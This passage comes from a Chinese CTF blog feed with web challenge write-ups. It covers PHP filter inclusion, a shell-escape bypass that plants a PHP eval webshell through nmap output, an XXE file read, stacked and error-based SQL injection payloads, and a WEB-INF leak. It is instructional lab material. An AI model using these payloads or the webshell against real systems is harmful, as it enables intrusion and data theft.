class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?category=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=index<br></code></pre></td></tr></table></figure><p><img src="/2024/02/17/WebWriteUp7/image-20240217152943160.png" alt="image-20240217152943160"></p><p>将得到的字符解码后，可以在其中看到这样一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;category&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br><span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码对可包含的文件进行了过滤，那拿到flag肯定就需要借助这些已有的包含</p><p><img src="/2024/02/17/WebWriteUp7/image-20240217153838523.png" alt="image-20240217153838523"></p><p>将得到的页面上的内容解码即可</p><p><img src="/2024/02/17/WebWriteUp7/image-20240217153825412.png" alt="image-20240217153825412"></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p><img src="/2024/02/17/WebWriteUp7/image-20240218213612919.png" alt="image-20240218213612919"></p><p>进来是一段代码</p><ol><li><code>if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))</code> 部分：检查是否存在 <code>HTTP_X_FORWARDED_FOR</code>，如果存在，则将 <code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 的值设置为 <code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>。这是一种尝试使用代理服务器提供的客户端 IP 地址替代默认的 <code>REMOTE_ADDR</code>。</li><li><code>if(!isset($_GET[&#39;host&#39;]))</code> 部分：检查是否存在 GET 请求中的 <code>host</code> 参数。如果不存在，使用 <code>highlight_file(__FILE__);</code> 显示当前文件的代码。</li><li>如果存在 <code>host</code> 参数，进行以下操作：<ul><li>获取 <code>$_GET[&#39;host&#39;]</code> 的值，将其经过 <code>escapeshellarg</code> 和 <code>escapeshellcmd</code> 处理，以防止命令注入漏洞。</li><li>使用 <code>md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;])</code> 生成一个目录名作为沙箱，并输出 “you are in sandbox <sandbox>“。</sandbox></li><li>使用 <code>@mkdir($sandbox)</code> 尝试创建该目录，<code>@</code> 符号用于抑制可能的错误信息。</li><li>切换当前工作目录到沙箱目录，即 <code>chdir($sandbox)</code>。</li><li>使用 <code>system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host)</code> 执行系统命令，其中包含对用户输入的 <code>host</code> 参数的使用。</li></ul></li></ol><p>用到了<code>escapeshellarg()</code>&amp;<code>escapeshellcmd()</code>函数绕过。这两个函数都是让输入的内容变成字符串的形式，但是处理的方式不同。</p><blockquote><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined">1.确保用户只传递一个参数给命令<br>2.用户不能指定更多的参数一个<br>3.用户不能执行不同的命令<br></code></pre></td></tr></table></figure><h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined">1.确保用户只执行一个命令<br>2.用户可以指定不限数量的参数<br>3.用户不能执行不同的命令<br></code></pre></td></tr></table></figure></blockquote><p>当输入的字符先通过<code>escapeshellarg()</code>再通过<code>escapeshellcmd()</code>这两个函数进行转义之后会存在漏洞，当我们输入<code>&#39; whoami &#39;</code>，经过这两个函数处理之后变为<code>&#39;&#39;\\&#39;&#39; whoami &#39;\\&#39;&#39;&#39;</code>，这让就让所有<code>&#39;</code>都闭合掉了，从而绕过函数通过<code>&#39;</code>让参数变成字符串的过滤。</p><p>再来看第二个利用的点，nmap命令的<code>-oG</code>参数能够将命令和结果都写入一个文件里面，从而可以写入一句话木马：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG test.php &#x27;</span><br></code></pre></td></tr></table></figure><p>用蚁剑连接：</p><p><img src="/2024/02/17/WebWriteUp7/image-20240218215045034.png" alt="image-20240218215045034"></p><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p><img src="/2024/02/17/WebWriteUp7/image-20240219193536865.png" alt="image-20240219193536865"></p><p><img src="/2024/02/17/WebWriteUp7/image-20240219193641508.png" alt="image-20240219193641508"></p><p>以为是一道sql注入题，但好像username那儿不存在注入点，尝试命令注入，也统统被拦下来了</p><blockquote><p><strong>新知识点：XXE漏洞</strong>（<a href="https://xz.aliyun.com/t/6887">xml相关漏洞</a>）</p><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p></blockquote><p>这里访问页面源码，在script部分找到一下内容，对于代码的解释写在注释里：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs javascript"> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doLogin</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br><span class="hljs-keyword">var</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br><span class="hljs-keyword">if</span>(username == <span class="hljs-string">&quot;&quot;</span> || password == <span class="hljs-string">&quot;&quot;</span>)&#123;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Please enter the username and password!&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<span class="hljs-comment">//获取用户名和密码，检查是否为空</span><br><br><span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; <span class="hljs-comment">//构造了一个xml实体（从这里判断可能存在xxe注入）</span><br>    $.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-comment">//使用 jQuery 的 $.ajax 函数发起一个 POST 请求到服务器的 doLogin.php 页面</span><br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;doLogin.php&quot;</span>,<br>        <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span>,<br>        <span class="hljs-attr">data</span>: data,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;xml&quot;</span>,<br>        <span class="hljs-attr">anysc</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">result</span>) &#123;<br>        <span class="hljs-keyword">var</span> code = result.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;code&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;<br>        <span class="hljs-keyword">var</span> msg = result.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;msg&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;<br>        <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;0&quot;</span>)&#123;<br>        $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(msg + <span class="hljs-string">&quot; login fail!&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;1&quot;</span>)&#123;<br>        $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(msg + <span class="hljs-string">&quot; login success!&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>        $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(<span class="hljs-string">&quot;error:&quot;</span> + msg);<br>        &#125;<span class="hljs-comment">//根据 code 的值进行不同的处理，更新页面上的提示信息。</span><br>        &#125;,<br>        <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;<br>            $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(errorThrown + <span class="hljs-string">&#x27;:&#x27;</span> + textStatus);<br>        &#125;<br>    &#125;); <br>&#125;<br></code></pre></td></tr></table></figure><p>从这里也能看出，并不存在sql语句之类的拼接，自然sql注入的手段全部不行</p><p>抓个包，要完成flag得获取，这里就得构造恶意的xml实体</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;!DOCTYPE ANY [</code>：这是声明 XML 文档类型（DOCTYPE）的开始，<code>ANY</code> 是一个通配符，表示可以接受任何类型的文档类型声明。</p><p><code>&lt;!ENTITY test SYSTEM &quot;file:///flag&quot;&gt;</code>：这是 XML 实体的定义，创建了一个名为 <code>test</code> 的实体，其内容从指定的系统文件中加载，这里的文件路径是 “file:&#x2F;&#x2F;&#x2F;flag”，表示加载根目录下的 “flag” 文件。</p><p><img src="/2024/02/17/WebWriteUp7/image-20240219201314313.png" alt="image-20240219201314313"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp6</title>
    <link href="/2024/02/15/WebWriteUp6/"/>
    <url>/2024/02/15/WebWriteUp6/</url>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><img src="/2024/02/15/WebWriteUp6/image-20240215204748047.png" alt="image-20240215204748047"></p><p>判断为字符型注入</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215205117946.png" alt="image-20240215205117946"></p><p>老规矩查询字段数：</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215210150043.png" alt="image-20240215210150043"></p><p>不出意外，存在一个黑名单</p><p>这长得跟之前一道堆叠注入的题一样，见<a href="https://tehs411.github.io/2024/01/24/WebWriteUp/#%E9%9A%8F%E4%BE%BF%E6%B3%A8">WebWriteUp</a></p><p>尝试堆叠注入：</p><p>1’; show databases;#</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215211301582.png" alt="image-20240215211301582"></p><p>1’; show tables;</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215211337899.png" alt="image-20240215211337899"></p><p>查列：1’; show columns from FlagHere;</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215211552322.png" alt="image-20240215211552322"></p><p>由于set被过滤掉了，修改表名的方法不好使，那么使用handler方法：</p><p>构造payload：1’; handler FlagHere open; handler FlagHere read first;</p><p>即可拿到flag</p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><img src="/2024/02/15/WebWriteUp6/image-20240215212312862.png" alt="image-20240215212312862"></p><p>随便输入试试，用户名1，密码2</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215212338501.png" alt="image-20240215212338501"></p><p>点击help看看</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215212414036.png" alt="image-20240215212414036"></p><p>提示说找不到这个help.docx</p><p>直接url访问试试</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215213150168.png" alt="image-20240215213150168"></p><p>能下载，但打开后啥也没有</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215213218161.png" alt="image-20240215213218161"></p><p>那么既然能通过url访问目录直接下载，那么得尝试敏感文件：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/WEB-INF/</span>web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br><span class="hljs-regexp">/WEB-INF/</span>classes/：含了站点所有用的 <span class="hljs-keyword">class</span> 文件，包括 servlet <span class="hljs-keyword">class</span> 和非servlet <span class="hljs-keyword">class</span>，他们不能包含在 .jar文件中<br><span class="hljs-regexp">/WEB-INF/</span>lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br><span class="hljs-regexp">/WEB-INF/</span>src/：源码目录，按照包名结构放置各个java文件<br><span class="hljs-regexp">/WEB-INF/</span>database.properties：数据库配置文件<br></code></pre></td></tr></table></figure><p>所以尝试访问&#x2F;WEB-INF&#x2F;web.xml</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215213426726.png" alt="image-20240215213426726"></p><p>404了</p><p>在点击help的界面尝试（因为此处url自动加了个Download）</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215213706064.png" alt="image-20240215213706064"></p><p>依然没用，尝试用post方式试试：</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215213802810.png" alt="image-20240215213802810"></p><p>成功下载，查看：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>Index<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>IndexController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Index<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>LoginController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Login<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>DownloadController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Download<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>FlagController<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Flag<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>Servlet 是 Java 编程语言的一种用于扩展服务器功能的技术。Servlet 是在服务器端运行的小型程序，它提供了一种处理客户端请求并生成动态网页的方法。</p></blockquote><p>这段代码告诉我们，编译之后就会生成一个FlagController.class这个类</p><p>下载下来：</p><p><img src="/2024/02/15/WebWriteUp6/image-20240215214206502.png" alt="image-20240215214206502"></p><p><img src="/2024/02/15/WebWriteUp6/image-20240215214426539.png" alt="image-20240215214426539"></p><p>打开是一堆乱码，但有一串字符后有&#x3D;&#x3D;，base64解密后得到flag</p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="/2024/02/15/WebWriteUp6/image-20240216204606234.png" alt="image-20240216204606234"></p><p>点击flag：发现屏幕会显示出当前机器的ip</p><p>点击hint：hint的源码中存在这样的注释</p><p><img src="/2024/02/15/WebWriteUp6/image-20240216204937344.png" alt="image-20240216204937344"></p><p>抓包看看，并没有发现有什么显示了ip的地方</p><p><img src="/2024/02/15/WebWriteUp6/image-20240216210713160.png" alt="image-20240216210713160"></p><p>感觉获取的途径可能是从Header中获取的，尝试修改XFF试试（<a href="https://tehs411.github.io/2024/01/29/WebWriteUp2/#HTTP">XFF相关</a>）</p><p><img src="/2024/02/15/WebWriteUp6/image-20240216211555399.png" alt="image-20240216211555399"></p><p>发现可以修改，那么就可能存在XFF注入</p><p><img src="/2024/02/15/WebWriteUp6/image-20240216212349425.png" alt="image-20240216212349425"></p><p>看到当前目录存在flag.php，但这个就是我们现在访问的页面，按着之前的题目，通常flag在根目录，尝试目录穿越：(其实这里一层就行了)</p><p><img src="/2024/02/15/WebWriteUp6/image-20240216212533280.png" alt="image-20240216212533280"></p><p>获取flag：</p><p><img src="/2024/02/15/WebWriteUp6/image-20240216212625882.png" alt="image-20240216212625882"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp5</title>
    <link href="/2024/02/12/WebWriteUp5/"/>
    <url>/2024/02/12/WebWriteUp5/</url>
    
    <content type="html"><![CDATA[<h3 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h3><p><img src="/2024/02/12/WebWriteUp5/image-20240212131853474.png" alt="image-20240212131853474"></p><p>还是这个熟悉的界面</p><p><strong>判断数字型还是字符型</strong></p><p>用户名1，密码2’ or 1&#x3D;1#，回显如下，暂时无法判断</p><p><img src="/2024/02/12/WebWriteUp5/image-20240212131943122.png" alt="image-20240212131943122"></p><p>直接使用union，select试试，都是这个界面，所以说，这些关键词应该全部被过滤掉了</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。简单点说，就是在可以进行sql注入的位置，调用特殊的函数执行，利用函数报错使其输出错误结果来获取数据库的相关信息</p><p><strong>BigInt数据类型溢出</strong></p><p>获取表名payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a)) --+</span><br></code></pre></td></tr></table></figure><p>获取列名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and exp(~(select * from (select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)a)) --+<br></code></pre></td></tr></table></figure><p>获取对应信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and exp(~(select * from(select username from &#x27;users&#x27; limit 0,1))) --+<br></code></pre></td></tr></table></figure><p>原理：</p><p>exp(int)函数返回e的x次方，当x的值足够大的时候就会导致函数的结果数据类型溢出，也就会因此报错：”DOUBLE value is out of range”</p><p>?id&#x3D;1” and exp(~(select * from (select user())a)) –+</p><p>先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a</p><p>然后在查询select * from a 查询a，将结果集a全部查询出来</p><p>查询完成，语句成功执行，返回值为0，再取反(~按位取反运算符)，exp调用的时候e的那个数的次方，就会造成报错，再通过–+注释掉可能存在的其他语句</p><p>在本题中，尝试过程中发现依然无法实现此方法，可能是exp被过滤掉了</p><p><strong>函数参数格式错误</strong></p><p>应用的函数：<strong>updatexml()    extractvalue()</strong></p><p>我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错</p><blockquote><p>XPath（XML Path Language）是一种用于在 XML 文档中定位和选择元素的查询语言。通常，XPath 表达式是由一系列路径和条件组成，用于在 XML 文档中导航和选择节点。XPath 表达式可以包含多个部分，例如节点名称、路径运算符、谓词和函数。</p></blockquote><p><strong>updatexml()函数语法：updatexml(XML_document,Xpath_string,new_value)</strong></p><p>XML_document:是字符串String格式，为XML文档对象名称</p><p>Xpath_string:Xpath格式的字符串</p><p>new_value:string格式，替换查找到的符合条件的数据</p><p><strong>当第二个参数的格式和Xpath的格式不符的时候，就会产生报错，我们可以将我们的payload构造到第二个参数中，让其随着报错信息展示到页面上。而~符号(ascii编码值：0x7e)是不存在xpath格式中的</strong></p><p>查询当前数据库的用户信息以及数据库版本信息:</p><figure 